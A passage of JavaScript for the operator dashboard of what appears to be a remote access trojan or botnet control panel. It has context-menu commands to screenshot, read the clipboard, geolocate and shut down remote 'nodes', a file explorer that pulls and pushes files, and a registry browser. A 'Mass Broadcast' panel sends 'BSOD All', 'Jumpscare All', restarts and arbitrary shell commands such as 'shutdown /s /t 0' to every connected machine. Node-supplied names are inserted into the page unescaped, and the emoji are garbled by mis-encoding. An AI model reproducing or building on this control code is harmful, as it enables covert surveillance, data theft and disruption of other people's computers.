		if (!document.getElementById("cp-style")) document.head.appendChild(style);
	}

	function _moveSel(dir) {
		const items = [...(document.querySelectorAll(".cp-item") || [])];
		if (!items.length) return;
		const cur = items.findIndex(i => i.classList.contains("cp-active"));
		items.forEach(i => i.classList.remove("cp-active"));
		const next = Math.max(0, Math.min(items.length - 1, cur + dir));
		items[next].classList.add("cp-active");
		items[next].scrollIntoView({ block: "nearest" });
	}

	function _execSel() {
		const active = document.querySelector(".cp-item.cp-active");
		if (active) window._execPaletteItem(active);
	}

	window._execPaletteItem = function(el) {
		const cmd  = el.dataset.cmd;
		const args = JSON.parse(el.dataset.args || "{}");
		sendCmd(cmd, args);
		_closePalette();
		if (typeof showToast === "function") showToast(`âŒ˜ ${cmd}`, "teal");
	};

	function _openPalette() {
		_buildPalette();
		_paletteEl.style.display = "block";
		_paletteOpen = true;
		setTimeout(() => document.getElementById("cmdPaletteInput")?.focus(), 50);
	}

	function _closePalette() {
		if (_paletteEl) _paletteEl.style.display = "none";
		_paletteOpen = false;
	}

	// Keyboard shortcut Ctrl+K
	document.addEventListener("keydown", e => {
		if ((e.ctrlKey || e.metaKey) && e.key === "k") {
			e.preventDefault();
			_paletteOpen ? _closePalette() : _openPalette();
		}
		if (e.key === "Escape" && _paletteOpen) _closePalette();
	});

	// Click outside to close
	document.addEventListener("mousedown", e => {
		if (_paletteOpen && _paletteEl && !_paletteEl.contains(e.target)) _closePalette();
	});

	// Expose for HUD button
	window.openCommandPalette = _openPalette;
})();

/* â”€â”€ RIGHT-CLICK CONTEXT MENU ON NODE CARDS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
(function _initNodeContextMenu() {
	const MENU_ITEMS = [
		{ label: "ðŸ–¥ Open Remote",    fn: n => openRemote(n.id, n) },
		{ label: "ðŸ“¸ Screenshot",     fn: n => sendCmdTo(n.id, "screenshot_snap", {}) },
		{ label: "ðŸ“‹ Get Clipboard",  fn: n => sendCmdTo(n.id, "clipboard_get", {}) },
		{ label: "ðŸŒ Geolocation",    fn: n => sendCmdTo(n.id, "get_geo", {}) },
		{ label: "ðŸ“Š Full Audit",     fn: n => sendCmdTo(n.id, "get_system_info", {}) },
		{ label: "ðŸ”‹ Battery",        fn: n => sendCmdTo(n.id, "get_battery", {}) },
		{ label: "ðŸ”’ Lock Screen",    fn: n => sendCmdTo(n.id, "lock_screen", {}) },
		{ label: "ðŸ”„ Restart (10s)",  fn: n => sendCmdTo(n.id, "restart", {delay:10}) },
		{ label: "â» Shutdown (10s)", fn: n => sendCmdTo(n.id, "shutdown", {delay:10}) },
	];

	let _ctxMenu = null;
	let _ctxNode = null;

	function _buildMenu() {
		if (_ctxMenu) return;
		const m = document.createElement("div");
		m.id = "nodeCtxMenu";
		m.style.cssText = `
			position:fixed; z-index:99998; min-width:180px;
			background:rgba(10,10,16,0.97); border:1px solid rgba(0,240,255,.2);
			border-radius:12px; padding:.4rem 0; display:none;
			box-shadow:0 20px 60px rgba(0,0,0,.8); backdrop-filter:blur(30px);
		`;
		m.innerHTML = MENU_ITEMS.map((item, i) => `
			<div class="ctx-item" data-idx="${i}"
				style="padding:.5rem 1rem;font-size:.78rem;color:var(--text-2);cursor:pointer;transition:background .15s,color .15s"
				onmouseenter="this.style.background='rgba(0,240,255,.08)';this.style.color='var(--accent)'"
				onmouseleave="this.style.background='';this.style.color='var(--text-2)'"
				onclick="window._ctxMenuExec(${i})">
				${item.label}
			</div>
		`).join("");
		document.body.appendChild(m);
		_ctxMenu = m;
	}

	window._ctxMenuExec = function(idx) {
		if (_ctxNode && MENU_ITEMS[idx]) MENU_ITEMS[idx].fn(_ctxNode);
		_ctxMenu.style.display = "none";
	};

	// Helper: send a command to a specific node (not the currently open one)
	window.sendCmdTo = function(nodeId, cmd, args) {
		// If that node is already the active remote, just use sendCmd
		if (window._currentRemoteNodeId === nodeId) {
			sendCmd(cmd, args);
		} else {
			// Open the remote first, then send
			openRemote(nodeId, currentNodes.find(n => n.id === nodeId));
			setTimeout(() => sendCmd(cmd, args), 800);
		}
	};

	// Wire context menu onto node grid via delegation
	document.addEventListener("contextmenu", e => {
		const card = e.target.closest(".node-card");
		if (!card) return;
		e.preventDefault();
		_buildMenu();
		// Find node data
		const nid = card.dataset.nodeId;
		_ctxNode = currentNodes.find(n => n.id === nid) || { id: nid };
		_ctxMenu.style.display = "block";
		_ctxMenu.style.left = Math.min(e.clientX, window.innerWidth - 200) + "px";
		_ctxMenu.style.top  = Math.min(e.clientY, window.innerHeight - 280) + "px";
	});

	document.addEventListener("click", () => {
		if (_ctxMenu) _ctxMenu.style.display = "none";
	});
})();

/* â”€â”€ EXPORT LOGS TO FILE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
window.exportLogs = function() {
	const logEl = document.getElementById("eventLog") || document.querySelector("[id*='log']");
	const text  = logEl ? logEl.innerText : "No log element found.";
	const blob  = new Blob([text], { type: "text/plain" });
	const a     = Object.assign(document.createElement("a"), {
		href: URL.createObjectURL(blob),
		download: `omega_log_${Date.now()}.txt`
	});
	document.body.appendChild(a);
	a.click();
	setTimeout(() => { a.remove(); URL.revokeObjectURL(a.href); }, 1000);
	if (typeof showToast === "function") showToast("ðŸ“¥ Logs exported", "teal");
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// â”€â”€ FEATURE: GRAPHICAL FILE EXPLORER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
let _fsBreadcrumb = [];
let _fsNodeId = null;

window.openFileExplorer = function(nodeId, startPath) {
	_fsNodeId = nodeId || currentTargetId;
	if (!_fsNodeId) { showToast("No node selected", "red"); return; }
	let modal = $("fileExplorerModal");
	if (!modal) {
		modal = document.createElement("div");
		modal.id = "fileExplorerModal";
		modal.style.cssText = `position:fixed;inset:0;z-index:99999;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.7);backdrop-filter:blur(8px)`;
		modal.innerHTML = `
		<div style="width:min(860px,95vw);height:min(580px,90vh);background:rgba(8,8,12,.97);border:1px solid rgba(0,240,255,.25);border-radius:20px;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 40px 100px rgba(0,0,0,.9)">
			<div style="padding:1rem 1.25rem;border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;justify-content:space-between">
				<div style="display:flex;align-items:center;gap:.75rem">
					<span style="font-size:1.1rem">ðŸ“‚</span>
					<div>
						<div style="font-size:.85rem;font-weight:800;color:var(--accent)">FILE EXPLORER</div>
						<div id="fsBreadcrumb" style="font-size:.6rem;color:var(--text-3);font-family:'JetBrains Mono',monospace">/</div>
					</div>
				</div>
				<div style="display:flex;gap:.5rem;align-items:center">
					<button type="button" onclick="window._fsUpload()" style="background:rgba(0,240,255,.1);border:1px solid rgba(0,240,255,.3);color:var(--accent);border-radius:8px;padding:.35rem .75rem;font-size:.65rem;font-weight:700;cursor:pointer">ðŸ“¤ Upload</button>
					<button type="button" onclick="$('fileExplorerModal').style.display='none'" style="background:rgba(255,42,95,.1);border:1px solid rgba(255,42,95,.3);color:var(--red);border-radius:8px;padding:.35rem .75rem;font-size:.65rem;font-weight:700;cursor:pointer">âœ• Close</button>
				</div>
			</div>
			<div id="fsListing" style="flex:1;overflow-y:auto;padding:.75rem 1rem;display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:.5rem;align-content:start">
				<div style="grid-column:1/-1;text-align:center;padding:3rem;color:var(--text-3)">Loading...</div>
			</div>
			<div id="fsStatus" style="padding:.5rem 1rem;border-top:1px solid rgba(255,255,255,.04);font-size:.6rem;color:var(--text-3);font-family:'JetBrains Mono',monospace">Ready</div>
		</div>`;
		document.body.appendChild(modal);
		modal.addEventListener("click", e => { if (e.target === modal) modal.style.display = "none"; });
	}
	modal.style.display = "flex";
	_fsBreadcrumb = [];
	window._fsNavigate(startPath || "C:\\");
};

window._fsNavigate = function(path) {
	if (!_fsNodeId || !socket) return;
	if ($("fsStatus")) $("fsStatus").textContent = `Loading: ${path}`;
	socket.send(JSON.stringify({ type: "ls", path, id: _fsNodeId }));
	if ($("fsBreadcrumb")) $("fsBreadcrumb").textContent = path;
	if ($("fsTabBreadcrumb")) $("fsTabBreadcrumb").textContent = path;
	_fsBreadcrumb = [path];
};

window._fsRenderDir = function(data) {
	const listing = $("fsListing");
	const tabListing = $("fsTabListing");
	if (!listing && !tabListing) return;
	const items = data.items || data.entries || [];
	if (!items.length) { 
		const emptyMsg = `<div style="grid-column:1/-1;text-align:center;padding:3rem;color:var(--text-3);font-size:.8rem">ðŸ“­ Empty directory</div>`;
		if (listing) listing.innerHTML = emptyMsg;
		if (tabListing) tabListing.innerHTML = emptyMsg;
		return; 
	}
	const html = items.map(item => {
		const isDir = item.type === "dir" || item.is_dir;
		const icon  = isDir ? "ðŸ“" : _fsFileIcon(item.name);
		const size  = isDir ? "" : _fsFormatSize(item.size);
		return `<div onclick="window._fsClickItem(${JSON.stringify(JSON.stringify(item))})"
			style="padding:.65rem .8rem;border-radius:12px;border:1px solid rgba(255,255,255,.06);background:rgba(255,255,255,.02);cursor:pointer;transition:all .15s;display:flex;flex-direction:column;gap:.3rem;overflow:hidden"
			onmouseenter="this.style.background='rgba(0,240,255,.06)';this.style.borderColor='rgba(0,240,255,.2)'"
			onmouseleave="this.style.background='rgba(255,255,255,.02)';this.style.borderColor='rgba(255,255,255,.06)'">
			<span style="font-size:1.2rem">${icon}</span>
			<span style="font-size:.62rem;font-weight:700;color:var(--text-1);word-break:break-all;line-height:1.3;max-height:2.6em;overflow:hidden">${item.name}</span>
			${size ? `<span style="font-size:.55rem;color:var(--text-3)">${size}</span>` : ""}
		</div>`;
	}).join("");
	if (listing) listing.innerHTML = html;
	if (tabListing) tabListing.innerHTML = html;
	$("fsStatus") && ($("fsStatus").textContent = `${items.length} items`);
};

window._fsClickItem = function(itemJson) {
	const item = JSON.parse(itemJson);
	const isDir = item.type === "dir" || item.is_dir;
	if (isDir) { window._fsNavigate(item.path || item.name); }
	else {
		if (confirm(`Download "${item.name}" from node?`)) {
			socket.send(JSON.stringify({ type: "download_file", path: item.path, id: _fsNodeId }));
			showToast(`ðŸ“¥ Downloading ${item.name}â€¦`, "teal");
		}
	}
};

window._fsUpload = function() {
	const inp = document.createElement("input");
	inp.type = "file";
	inp.onchange = e => {
		const f = e.target.files[0];
		if (!f) return;
		const destPath = (_fsBreadcrumb[0] || "C:\\") + "\\" + f.name;
		const r = new FileReader();
		r.onload = ev => {
			const b64 = ev.target.result.split(",")[1];
			socket.send(JSON.stringify({ type: "upload_file", name: f.name, path: destPath, data: b64, id: _fsNodeId }));
			showToast(`ðŸ“¤ Uploading ${f.name}â€¦`, "ok");
		};
		r.readAsDataURL(f);
	};
	inp.click();
};

function _fsFileIcon(name) {
	const ext = (name.split(".").pop() || "").toLowerCase();
	const icons = { exe:"âš™ï¸", dll:"ðŸ”§", txt:"ðŸ“„", log:"ðŸ“‹", jpg:"ðŸ–¼ï¸", jpeg:"ðŸ–¼ï¸", png:"ðŸ–¼ï¸", gif:"ðŸ–¼ï¸", mp4:"ðŸŽ¬", mp3:"ðŸŽµ", zip:"ðŸ“¦", rar:"ðŸ“¦", pdf:"ðŸ“•", doc:"ðŸ“", docx:"ðŸ“", py:"ðŸ", js:"ðŸŸ¨", json:"ðŸ“Š", bat:"âš¡", ps1:"ðŸ’™" };
	return icons[ext] || "ðŸ“„";
}
function _fsFormatSize(bytes) {
	if (!bytes) return "";
	if (bytes < 1024) return `${bytes} B`;
	if (bytes < 1048576) return `${(bytes/1024).toFixed(1)} KB`;
	return `${(bytes/1048576).toFixed(1)} MB`;
}

// fs_resp is handled natively in the main handleMsg switch above.


// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// â”€â”€ FEATURE: MULTI-NODE SPLIT VIEW â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
let _splitViewOpen = false;
let _splitSessions = {}; // nodeId â†’ canvas element

window.openSplitView = function() {
	let modal = $("splitViewModal");
	if (!modal) {
		modal = document.createElement("div");
		modal.id = "splitViewModal";
		modal.style.cssText = `position:fixed;inset:0;z-index:99998;background:#000;display:flex;flex-direction:column`;
		modal.innerHTML = `
		<div style="padding:.6rem 1rem;background:rgba(8,8,12,.95);border-bottom:1px solid rgba(0,240,255,.2);display:flex;align-items:center;justify-content:space-between">
			<div style="display:flex;align-items:center;gap:.75rem">
				<span style="font-size:.85rem;font-weight:800;color:var(--accent);letter-spacing:.08em">âŠž SPLIT VIEW</span>
				<span id="splitViewCount" style="font-size:.65rem;color:var(--text-3)">Select nodes below (max 4)</span>
			</div>
			<button type="button" onclick="$('splitViewModal').style.display='none'" style="background:rgba(255,42,95,.1);border:1px solid rgba(255,42,95,.3);color:var(--red);border-radius:8px;padding:.3rem .75rem;font-size:.65rem;font-weight:700;cursor:pointer">âœ• Exit Split View</button>
		</div>
		<div id="splitNodePicker" style="padding:.75rem 1rem;background:rgba(8,8,12,.9);border-bottom:1px solid rgba(255,255,255,.05);display:flex;gap:.5rem;flex-wrap:wrap"></div>
		<div id="splitGrid" style="flex:1;display:grid;gap:2px;background:#111;overflow:hidden"></div>`;
		document.body.appendChild(modal);
	}
	modal.style.display = "flex";
	_splitViewOpen = true;
	window._renderSplitPicker();
};

window._renderSplitPicker = function() {
	const picker = $("splitNodePicker");
	if (!picker) return;
	const online = currentNodes.filter(n => n.status === "Online");
	picker.innerHTML = online.map(n => {
		const active = _splitSessions[n.id];
		return `<button type="button" onclick="window._toggleSplitNode('${n.id}')"
			style="padding:.3rem .7rem;border-radius:8px;font-size:.65rem;font-weight:700;cursor:pointer;border:1px solid ${active ? 'var(--teal)' : 'rgba(255,255,255,.15)'};background:${active ? 'rgba(0,255,204,.1)' : 'rgba(255,255,255,.03)'};color:${active ? 'var(--teal)' : 'var(--text-2)'}">
			${n.specs?.hostname || n.id}
		</button>`;
	}).join("") || `<span style="color:var(--text-3);font-size:.7rem">No online nodes</span>`;
};

window._toggleSplitNode = function(nodeId) {
	if (_splitSessions[nodeId]) {
		delete _splitSessions[nodeId];
	} else {
		if (Object.keys(_splitSessions).length >= 4) { showToast("Max 4 nodes in split view", "red"); return; }
		_splitSessions[nodeId] = true;
	}
	window._renderSplitPicker();
	window._buildSplitGrid();
};

window._buildSplitGrid = function() {
	const grid = $("splitGrid");
	if (!grid) return;
	const ids = Object.keys(_splitSessions);
	const cols = ids.length <= 1 ? 1 : ids.length <= 2 ? 2 : 2;
	grid.style.gridTemplateColumns = `repeat(${cols}, 1fr)`;
	grid.style.gridTemplateRows = `repeat(${Math.ceil(ids.length/cols)}, 1fr)`;
	grid.innerHTML = ids.map(nid => {
		const node = currentNodes.find(n => n.id === nid);
		const label = node?.specs?.hostname || nid;
		return `<div style="position:relative;background:#000;overflow:hidden" data-splitnodeid="${nid}">
			<canvas id="splitCanvas_${nid}" style="width:100%;height:100%;object-fit:contain;display:block"></canvas>
			<div style="position:absolute;top:8px;left:8px;background:rgba(0,0,0,.7);padding:.2rem .5rem;border-radius:6px;font-size:.6rem;font-weight:700;color:var(--accent)">${label}</div>
			<button type="button" onclick="openRemote('${nid}',currentNodes.find(n=>n.id==='${nid}'))"
				style="position:absolute;bottom:8px;right:8px;background:rgba(0,240,255,.15);border:1px solid var(--accent);color:var(--accent);border-radius:6px;padding:.25rem .6rem;font-size:.6rem;cursor:pointer">Open</button>
		</div>`;
	}).join("");
	// Request streams from all selected nodes
	ids.forEach(nid => {
		if (socket?.readyState === WebSocket.OPEN) {
			socket.send(JSON.stringify({ type: "select_device", id: nid }));
			socket.send(JSON.stringify({ type: "stream", cmd: "start", id: nid }));
		}
	});
	const countEl = $("splitViewCount");
	if (countEl) countEl.textContent = `${ids.length} nodes selected`;
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// â”€â”€ FEATURE: MASS BROADCAST UI â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
window.openMassBroadcast = function() {
	let modal = $("massBroadcastModal");
	if (!modal) {
		modal = document.createElement("div");
		modal.id = "massBroadcastModal";
		modal.style.cssText = `position:fixed;inset:0;z-index:99997;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.7);backdrop-filter:blur(8px)`;
		modal.innerHTML = `
		<div style="width:min(540px,94vw);background:rgba(8,8,12,.97);border:1px solid rgba(251,191,36,.3);border-radius:20px;overflow:hidden;box-shadow:0 40px 100px rgba(0,0,0,.9)">
			<div style="padding:1.25rem;border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;justify-content:space-between">
				<div style="display:flex;align-items:center;gap:.75rem">
					<span style="font-size:1.1rem">ðŸ“¡</span>
					<div>
						<div style="font-size:.85rem;font-weight:800;color:var(--amber)">MASS BROADCAST</div>
						<div style="font-size:.6rem;color:var(--text-3)">Send command to ALL connected nodes</div>
					</div>
				</div>
				<button type="button" onclick="$('massBroadcastModal').style.display='none'" style="background:transparent;border:none;color:var(--text-3);font-size:1.2rem;cursor:pointer">âœ•</button>
			</div>
			<div style="padding:1.25rem;display:flex;flex-direction:column;gap:1rem">
				<div style="display:grid;grid-template-columns:1fr 1fr;gap:.5rem">
					${[
						["ðŸ’¥ BSOD All",        "bsod",           "red"],
						["ðŸ”’ Lock All",        "lock_workstation","amber"],
						["ðŸ”Š Beep All",        "beep",           "violet"],
						["ðŸ’¬ Toast All",       "show_toast",     "teal"],
						["ðŸ”„ Restart All",     "restart",        "red"],
						["ðŸ’¡ Jumpscare All",   "jumpscare",      "violet"],
					].map(([label, type, color]) =>
						`<button type="button" onclick="window._massSend('${type}')"
							style="padding:.75rem;border-radius:12px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.03);color:var(--text-2);font-size:.72rem;font-weight:700;cursor:pointer;text-align:left;transition:all .15s"
							onmouseenter="this.style.background='rgba(255,255,255,.08)';this.style.color='var(--text-1)'"
							onmouseleave="this.style.background='rgba(255,255,255,.03)';this.style.color='var(--text-2)'">${label}</button>`
					).join("")}
				</div>
				<div style="border-top:1px solid rgba(255,255,255,.06);padding-top:1rem">
					<div style="font-size:.65rem;font-weight:700;color:var(--text-3);margin-bottom:.5rem">CUSTOM SHELL COMMAND (ALL NODES)</div>
					<div style="display:flex;gap:.5rem">
						<input id="massShellInput" type="text" placeholder="e.g. shutdown /s /t 0"
							style="flex:1;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:8px;padding:.5rem .75rem;font-size:.72rem;color:var(--text-1);font-family:'JetBrains Mono',monospace;outline:none">
						<button type="button" onclick="window._massSendShell()"
							style="background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.3);color:var(--amber);border-radius:8px;padding:.5rem 1rem;font-size:.7rem;font-weight:700;cursor:pointer">SEND</button>
					</div>
				</div>
				<div id="massBroadcastResult" style="font-size:.65rem;color:var(--text-3);font-family:'JetBrains Mono',monospace;min-height:1.2em"></div>
			</div>
		</div>`;
		document.body.appendChild(modal);
		modal.addEventListener("click", e => { if (e.target === modal) modal.style.display = "none"; });
	}
	modal.style.display = "flex";
};

window._massSend = async function(type, extra = {}) {
	const res = $("massBroadcastResult");
	if (res) res.textContent = "Sendingâ€¦";
	try {
		const r = await fetch("/api/node/broadcast", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ type, ...extra }) });
		const d = await r.json();
		if (res) res.textContent = `âœ… Sent to ${d.sent} nodes`;
		showToast(`ðŸ“¡ Broadcast sent to ${d.sent} nodes`, "teal");
	} catch(e) {
		if (res) res.textContent = `âŒ Error: ${e}`;
	}
};

window._massSendShell = function() {
	const cmd = $("massShellInput")?.value?.trim();
	if (!cmd) return;
	window._massSend("shell", { cmd });
	$("massShellInput").value = "";
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// â”€â”€ FEATURE: GEO MAP AUTO-REFRESH â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
async function _refreshGeoMap() {
	try {
		const r = await fetch("/api/nodes/geo");
		if (!r.ok) return;
		const pins = await r.json();
		// Merge geo data into currentNodes
		pins.forEach(pin => {
			const node = currentNodes.find(n => n.id === pin.id);
			if (node) {
				if (!node.specs) node.specs = {};
				Object.assign(node.specs, { lat: pin.lat, lon: pin.lon, city: pin.city, country: pin.country, flag: pin.flag });
			}
		});
		if (typeof renderMapPins === "function") renderMapPins();
	} catch (_) {}
}
// Auto-refresh geo every 30s when map view is active
setInterval(() => {
	if ($("view-map")?.style.display !== "none") _refreshGeoMap();
}, 30000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// â”€â”€ TOOLBAR: Add Split View + File Explorer + Broadcast buttons to dashboard â”€â”€
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
document.addEventListener("DOMContentLoaded", () => {
	// Inject quick-access buttons into the top bar action area
	const actionRow = document.querySelector(".top-bar-actions") || document.querySelector(".top-bar .btn-ghost")?.parentElement;
	if (actionRow) {
		const btnSplit = document.createElement("button");
		btnSplit.type = "button";
		btnSplit.className = "btn-ghost";
		btnSplit.id = "btnSplitView";
		btnSplit.title = "Multi-Node Split View";
		btnSplit.style.cssText = "font-size:.65rem;padding:.3rem .7rem;border-color:rgba(0,240,255,.3);color:var(--accent)";
		btnSplit.innerHTML = "âŠž Split";
		btnSplit.onclick = () => window.openSplitView();

		const btnBroadcast = document.createElement("button");
		btnBroadcast.type = "button";
		btnBroadcast.className = "btn-ghost";
		btnBroadcast.id = "btnMassBroadcast";
		btnBroadcast.title = "Mass Broadcast to all nodes";
		btnBroadcast.style.cssText = "font-size:.65rem;padding:.3rem .7rem;border-color:rgba(251,191,36,.3);color:var(--amber)";
		btnBroadcast.innerHTML = "ðŸ“¡ Broadcast";
		btnBroadcast.onclick = () => window.openMassBroadcast();

		actionRow.prepend(btnBroadcast);
		actionRow.prepend(btnSplit);
	}
});

// Add File Explorer button to remote panel toolbar
const _origOpenRemote2 = window.openRemote;
if (typeof _origOpenRemote2 === "function" && !window._feHooked) {
	window._feHooked = true;
	// File Explorer accessible via _promptBrowse override when in remote view
	window._promptBrowse = window._promptBrowse || function() {};
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// â”€â”€ FEATURE: EXPOSE FILE EXPLORER IN REMOTE PANEL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Override the "Browse Files" button in the tools panel to use the new GUI
const _origPromptBrowse = window._promptBrowse;
// â”€â”€ FEATURE: GRAPHICAL REGISTRY EXPLORER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let _regNodeId = null;
let _regCurrentHive = "HKCU";
let _regCurrentPath = "";

window.openRegistryExplorer = function(nodeId, hive, path) {
	_regNodeId = nodeId || currentTargetId;
	if (!_regNodeId) { showToast("No node selected", "red"); return; }
	$("regExplorerModal").style.display = "flex";
	window._regNavigate(hive || _regCurrentHive, path || "");
};

window._regNavigate = function(hive, path) {
	if (!_regNodeId || !socket) return;
	_regCurrentHive = hive;
	_regCurrentPath = path;
	$("regStatus").textContent = "Loading...";
	$("regBreadcrumb").textContent = `${hive}\\${path}`;
	socket.send(JSON.stringify({ type: "reg_enum", hive, path, id: _regNodeId }));
};

window._regRender = function(data) {
	const keyList = $("regKeyListing");
	const valBody = $("regValueBody");
	if (!keyList || !valBody) return;
	
	// Render Keys
	let keyHtml = "";
	if (_regCurrentPath) {
		const parent = _regCurrentPath.split("\\").slice(0, -1).join("\\");
		keyHtml += `<div onclick="window._regNavigate('${_regCurrentHive}','${parent}')" style="padding:.5rem .75rem;border-radius:8px;cursor:pointer;font-size:.65rem;color:var(--amber);background:rgba(251,191,36,0.05);margin-bottom:4px">ðŸ“ .. [Parent]</div>`;
	}
	keyHtml += (data.subkeys || []).map(sk => `
		<div onclick="window._regNavigate('${_regCurrentHive}','${_regCurrentPath ? _regCurrentPath + '\\' + sk : sk}')"
			style="padding:.5rem .75rem;border-radius:8px;cursor:pointer;font-size:.65rem;color:var(--text-2);transition:all .15s"
			onmouseenter="this.style.background='rgba(255,255,255,0.05)';this.style.color='var(--text-1)'"
			onmouseleave="this.style.background='transparent';this.style.color='var(--text-2)'">ðŸ“ ${sk}</div>
	`).join("");
	keyList.innerHTML = keyHtml || `<div style="padding:2rem;text-align:center;color:var(--text-3);font-size:.6rem">No subkeys</div>`;
	
	// Render Values
	valBody.innerHTML = (data.values || []).map(v => `
		<tr style="border-bottom:1px solid rgba(255,255,255,0.03);transition:background 0.2s" onmouseenter="this.style.background='rgba(255,255,255,0.02)'" onmouseleave="this.style.background='transparent'">
			<td style="padding:.6rem 1rem;color:var(--text-1);font-weight:600">${v.name || '(Default)'}</td>
			<td style="padding:.6rem 1rem;color:var(--text-3);font-family:'JetBrains Mono',monospace;font-size:.55rem">${_regFormatType(v.type)}</td>
			<td style="padding:.6rem 1rem;color:var(--text-2);max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${v.data}">${v.data}</td>
		</tr>
	`).join("");
	if (!data.values?.length) {
